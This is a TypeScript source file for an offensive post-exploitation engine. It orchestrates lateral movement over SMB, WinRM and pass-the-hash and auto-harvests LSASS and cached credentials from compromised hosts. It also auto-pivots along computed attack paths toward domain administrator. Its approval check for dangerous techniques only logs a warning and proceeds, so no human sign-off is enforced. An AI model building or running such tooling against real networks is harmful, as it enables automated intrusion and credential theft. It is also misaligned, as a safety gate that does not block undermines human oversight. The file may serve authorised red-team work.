/**
 * LateralMovementEngine
 * Main orchestration engine for post-exploitation and lateral movement operations
 * Integrates credential vault, pathfinder, movement techniques, and swarm agents
 */

import { PrismaClient } from '@prisma/client';
import { EventEmitter } from 'events';
import logger from '../logger';
import { credentialVault } from './credential-vault';
import { pathfinder } from './pathfinder';
import { LateralMovementAgent } from './agents/lateral-movement-agent';
import { CredentialHarvesterAgent } from './agents/credential-harvester-agent';
import type {
  LateralMovementSession,
  LateralMovementRequest,
  LateralMovementResult,
  Credential,
  CompromisedHost,
  AttackPath,
  PrivilegeLevel
} from './types';

const prisma = new PrismaClient();

export interface EngineConfig {
  enableAutoPilot: boolean;
  enableAutoHarvest: boolean;
  maxConcurrentMovements: number;
  opsecLevel: 'low' | 'medium' | 'high';
  requireApprovalForDangerous: boolean;
}

export interface SessionOptions {
  targetDomain?: string;
  targetPrivilege?: PrivilegeLevel;
  autoHarvest?: boolean;
  autoPivot?: boolean;
}

export class LateralMovementEngine extends EventEmitter {
  private config: EngineConfig;
  private activeSessions: Map<string, LateralMovementSession>;
  private lateralMovementAgent: LateralMovementAgent | null = null;
  private credentialHarvesterAgent: CredentialHarvesterAgent | null = null;

  constructor(config: Partial<EngineConfig> = {}) {
    super();
    this.config = {
      enableAutoPilot: config.enableAutoPilot ?? false,
      enableAutoHarvest: config.enableAutoHarvest ?? true,
      maxConcurrentMovements: config.maxConcurrentMovements ?? 3,
      opsecLevel: config.opsecLevel ?? 'medium',
      requireApprovalForDangerous: config.requireApprovalForDangerous ?? true
    };
    this.activeSessions = new Map();
  }

  async initialize(agents?: {
    lateralMovementAgent?: LateralMovementAgent;
    credentialHarvesterAgent?: CredentialHarvesterAgent;
  }): Promise<void> {
    logger.info('Initializing LateralMovementEngine');

    // Initialize credential vault
    await credentialVault.initialize();

    // Set agents if provided
    if (agents?.lateralMovementAgent) {
      this.lateralMovementAgent = agents.lateralMovementAgent;
    }
    if (agents?.credentialHarvesterAgent) {
      this.credentialHarvesterAgent = agents.credentialHarvesterAgent;
    }

    // Configure pathfinder based on OPSEC level
    this.configurePathfinder();

    logger.info('LateralMovementEngine initialized');
  }

  private configurePathfinder(): void {
    const config: any = {
      preferFileless: this.config.opsecLevel !== 'low',
      avoidDangerous: this.config.requireApprovalForDangerous
    };

    if (this.config.opsecLevel === 'high') {
      config.maxDepth = 3;
      config.minConfidence = 0.6;
    } else if (this.config.opsecLevel === 'medium') {
      config.maxDepth = 5;
      config.minConfidence = 0.4;
    } else {
      config.maxDepth = 7;
      config.minConfidence = 0.2;
    }

    pathfinder.setConfig(config);
  }

  async startSession(
    workflowSessionId?: string,
    options: SessionOptions = {}
  ): Promise<LateralMovementSession> {
    logger.info(`Starting lateral movement session${workflowSessionId ? ` for workflow ${workflowSessionId}` : ''}`);

    const session = await prisma.lateralMovementSession.create({
      data: {
        workflowSessionId,
        targetDomain: options.targetDomain,
        status: 'running'
      }
    });

    this.activeSessions.set(session.id, session);

    this.emit('session:started', session);

    // Auto-harvest if enabled
    if (this.config.enableAutoHarvest && options.autoHarvest !== false) {
      await this.autoHarvestExistingHosts(session.id);
    }

    return session;
  }

  async stopSession(sessionId: string): Promise<void> {
    logger.info(`Stopping lateral movement session ${sessionId}`);

    const session = this.activeSessions.get(sessionId);
    if (!session) {
      throw new Error(`Session ${sessionId} not found`);
    }

    await prisma.lateralMovementSession.update({
      where: { id: sessionId },
      data: {
        status: 'completed',
        endTime: new Date(),
        summary: {
          discoveredHosts: session.discoveredHosts,
          compromisedHosts: session.compromisedHosts,
          credentialsFound: session.credentialsFound
        }
      }
    });

    this.activeSessions.delete(sessionId);
    this.emit('session:stopped', session);
  }

  async addCompromisedHost(host: Omit<CompromisedHost, 'id' | 'firstCompromised' | 'lastSeen' | 'credentials'>): Promise<CompromisedHost> {
    const created = await prisma.compromisedHost.create({
      data: {
        hostname: host.hostname,
        ipAddress: host.ipAddress,
        os: host.os,
        domain: host.domain,
        privileges: host.privileges,
        implantId: host.implantId
      }
    });

    // Update session stats
    for (const [sessionId, session] of this.activeSessions.entries()) {
      await prisma.lateralMovementSession.update({
        where: { id: sessionId },
        data: {
          discoveredHosts: session.discoveredHosts + 1
        }
      });
    }

    this.emit('host:compromised', created);

    return {
      id: created.id,
      hostname: created.hostname,
      ipAddress: created.ipAddress,
      os: created.os ?? undefined,
      domain: created.domain ?? undefined,
      privileges: created.privileges as PrivilegeLevel,
      implantId: created.implantId ?? undefined,
      firstCompromised: created.firstCompromised,
      lastSeen: created.lastSeen,
      credentials: []
    };
  }

  async discoverAttackPaths(
    sourceHostId: string,
    targetPrivilege: PrivilegeLevel = 'domain_admin'
  ): Promise<AttackPath[]> {
    logger.info(`Discovering attack paths from ${sourceHostId} to ${targetPrivilege}`);

    const paths = await pathfinder.discoverAttackPaths(sourceHostId, targetPrivilege);

    this.emit('paths:discovered', { sourceHostId, targetPrivilege, paths });

    return paths;
  }

  async executeMovement(request: LateralMovementRequest): Promise<LateralMovementResult> {
    logger.info(`Executing lateral movement from ${request.sourceHostId} to ${request.targetHostId}`);

    // Check if movement requires approval
    if (this.config.requireApprovalForDangerous && this.isDangerousTechnique(request.technique)) {
      this.emit('movement:approval_required', request);
      // In real implementation, this would wait for approval
      logger.warn(`Dangerous technique ${request.technique} requires approval`);
    }

    // Execute through technique
    let result: LateralMovementResult;

    switch (request.technique) {
      case 'smb':
        const { smbExecution } = await import('./techniques/smb');
        result = await smbExecution.execute(request);
        break;
      case 'winrm':
        const { winrmExecution } = await import('./techniques/winrm');
        result = await winrmExecution.execute(request);
        break;
      case 'pth':
        const { passTheHashExecution } = await import('./techniques/pass-the-hash');
        result = await passTheHashExecution.execute(request);
        break;
      default:
        throw new Error(`Unsupported technique: ${request.technique}`);
    }

    // Update session stats if successful
    if (result.success) {
      for (const [sessionId, session] of this.activeSessions.entries()) {
        await prisma.lateralMovementSession.update({
          where: { id: sessionId },
          data: {
            compromisedHosts: session.compromisedHosts + 1
          }
        });
      }
    }

    this.emit('movement:executed', result);

    return result;
  }

  async autoPivot(
    sourceHostId: string,
    targetPrivilege: PrivilegeLevel = 'domain_admin',
    sessionId?: string
  ): Promise<{
    success: boolean;
    compromisedHosts: number;
    credentialsFound: number;
    error?: string;
  }> {
    logger.info(`Auto-pivoting from ${sourceHostId} to ${targetPrivilege}`);

    if (!this.lateralMovementAgent && !this.config.enableAutoPilot) {
      throw new Error('LateralMovementAgent not configured or auto-pilot disabled');
    }

    try {
      // Get recommended path
      const recommendedPath = await pathfinder.getRecommendedPath(sourceHostId, targetPrivilege);

      if (!recommendedPath) {
        return {
          success: false,
          compromisedHosts: 0,
          credentialsFound: 0,
          error: 'No viable attack path found'
        };
      }

      let compromisedHosts = 0;
      let credentialsFound = 0;

      // Execute movement along the path
      for (let i = 0; i < recommendedPath.edges.length; i++) {
        const edge = recommendedPath.edges[i];
        const sourceNode = recommendedPath.nodes[i];
        const targetNode = recommendedPath.nodes[i + 1];

        // Find appropriate credential
        const credentials = await credentialVault.getCredentialsByHost(sourceNode.hostId);
        if (credentials.length === 0) {
          logger.warn(`No credentials found for host ${sourceNode.hostId}`);
          continue;
        }

        const credential = credentials[0];

        const result = await this.executeMovement({
          sourceHostId: edge.fromHostId,
          targetHostId: edge.toHostId,
          technique: edge.technique,
          credentialId: credential.id
        });

        if (result.success) {
          compromisedHosts++;

          // Auto-harvest credentials
          if (this.config.enableAutoHarvest) {
            const harvestResult = await credentialVault.harvestCredentials({
              hostId: edge.toHostId,
              methods: ['lsass', 'cached']
            });

            if (harvestResult.success) {
              credentialsFound += harvestResult.credentials.length;
            }
          }
        } else {
          logger.warn(`Failed to move from ${edge.fromHostId} to ${edge.toHostId}`);
          break;
        }
      }

      // Update session stats
      if (sessionId) {
        const session = this.activeSessions.get(sessionId);
        if (session) {
          await prisma.lateralMovementSession.update({
            where: { id: sessionId },
            data: {
              compromisedHosts: session.compromisedHosts + compromisedHosts,
              credentialsFound: session.credentialsFound + credentialsFound
            }
          });
        }
      }

      return {
        success: true,
        compromisedHosts,
        credentialsFound
      };
    } catch (error) {
      logger.error('Auto-pivot failed:', error);
      return {
        success: false,
        compromisedHosts: 0,
        credentialsFound: 0,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  private async autoHarvestExistingHosts(sessionId: string): Promise<void> {
    try {
      const hosts = await prisma.compromisedHost.findMany({
        where: {
          implantId: { not: null }
        }
      });

      for (const host of hosts) {
        const harvestResult = await credentialVault.harvestCredentials({
          hostId: host.id,
          methods: ['lsass', 'cached']
        });

        if (harvestResult.success) {
          await prisma.lateralMovementSession.update({
            where: { id: sessionId },
            data: {
              credentialsFound: {
                increment: harvestResult.credentials.length
              }
            }
          });
        }
      }
    } catch (error) {
      logger.error('Auto-harvest failed:', error);
    }
  }

  private isDangerousTechnique(technique: string): boolean {
    const dangerousTechniques = ['pth', 'kerberoast'];
    return dangerousTechniques.includes(technique);
  }

  async getSessionStats(sessionId: string): Promise<LateralMovementSession | null> {
    return prisma.lateralMovementSession.findUnique({
      where: { id: sessionId }
    });
  }

  async getVaultStats(): Promise<{
    totalCredentials: number;
    byType: Record<string, number>;
    byDomain: Record<string, number>;
  }> {
    return credentialVault.getVaultStats();
  }

  async visualizeGraph(): Promise<{
    nodes: Array<{ id: string; label: string; group: string }>;
    edges: Array<{ from: string; to: string; label: string; confidence: number }>;
  }> {
    return pathfinder.visualizeGraph();
  }

  setConfig(config: Partial<EngineConfig>): void {
    this.config = { ...this.config, ...config };
    this.configurePathfinder();
  }

  getConfig(): EngineConfig {
    return { ...this.config };
  }
}

// Singleton instance
export const lateralMovementEngine = new LateralMovementEngine();